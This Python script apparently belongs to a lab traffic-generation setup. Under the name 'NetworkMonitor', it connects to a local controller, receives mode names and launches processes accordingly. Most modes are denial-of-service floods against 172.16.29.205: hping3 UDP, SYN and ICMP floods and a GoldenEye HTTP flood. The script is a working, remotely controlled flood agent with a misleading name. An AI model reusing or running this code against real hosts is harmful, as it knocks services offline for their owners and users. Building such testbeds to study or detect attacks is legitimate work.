import socket
import subprocess
import os
import signal
import time
import shutil
from pathlib import Path

PORT_CMD = 7745

mode_binaries = {
    "normal_traffic": ("python3", ["traffic-gen.py", "--mode", "normal"]),
    "high_traffic": ("python3", ["traffic-gen.py", "--mode", "high"]),
    "udp_flood": ("hping3", ["--udp", "172.16.29.205", "-p", "80", "--flood"]),
    "tcp_flood": ("hping3", ["-S", "172.16.29.205", "-p", "80", "--flood"]),
    "http_flood": ("python3", ["goldeneye.py", "http://172.16.29.205"]),
    "icmp_flood": ("hping3", ["-1", "172.16.29.205", "--flood"])
}

class NetworkMonitor:
    def __init__(self, port=PORT_CMD):
        self.port = port
        self.sock = None
        self.current_process = None
        self.current_mode = None

    def find_binary(self, binary_name):
        local_path = Path(".") / binary_name
        if local_path.exists():
            return str(local_path)
        
        system_binary = shutil.which(binary_name)
        if system_binary:
            return system_binary
            
        return None

    def connect_to_controller(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect(("localhost", self.port))
                print(f"Connected to controller at localhost:{self.port}")
                return
            except ConnectionRefusedError:
                print("Retrying connection in 5 seconds")
                time.sleep(5)

    def launch_process(self, mode):
        if mode not in mode_binaries:
            print(f"Unknown mode: {mode}")
            return False

        binary_name, args = mode_binaries[mode]
        binary_path = self.find_binary(binary_name)

        if not binary_path:
            print(f"Binary not found: {binary_name}")
            return False

        try:
            process = subprocess.Popen(
                [binary_path] + args,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            self.current_process = process
            print(f"Launched process for mode {mode} with PID {process.pid}")
            return True
        except Exception as e:
            print(f"Failed to launch process: {e}")
            return False

    def kill_current_process(self):
        if self.current_process:
            try:
                os.kill(self.current_process.pid, signal.SIGKILL)
                self.current_process.wait(timeout=5)
            except (ProcessLookupError, subprocess.TimeoutExpired):
                pass
            print(f"Killed process with PID {self.current_process.pid}")
            self.current_process = None

    def handle_mode_change(self, new_mode):
        if new_mode != self.current_mode:
            print(f"Mode change detected: {new_mode}")
            self.kill_current_process()
            if self.launch_process(new_mode):
                self.current_mode = new_mode

    def run(self):
        while True:
            try:
                if not self.sock:
                    self.connect_to_controller()

                mode = self.sock.recv(1024).decode().strip()
                if not mode:
                    print("Lost connection to controller")
                    self.sock.close()
                    self.sock = None
                    continue

                self.handle_mode_change(mode)

            except socket.error as e:
                print(f"Socket error: {e}")
                if self.sock:
                    self.sock.close()
                    self.sock = None
                time.sleep(5)
            except Exception as e:
                print(f"Unexpected error: {e}")
                time.sleep(5)

    def cleanup(self):
        self.kill_current_process()
        if self.sock:
            self.sock.close()

def main():
    monitor = NetworkMonitor()
    try:
        monitor.run()
    except KeyboardInterrupt:
        print("\nShutting down client...")
    finally:
        monitor.cleanup()

if __name__ == "__main__":
    main()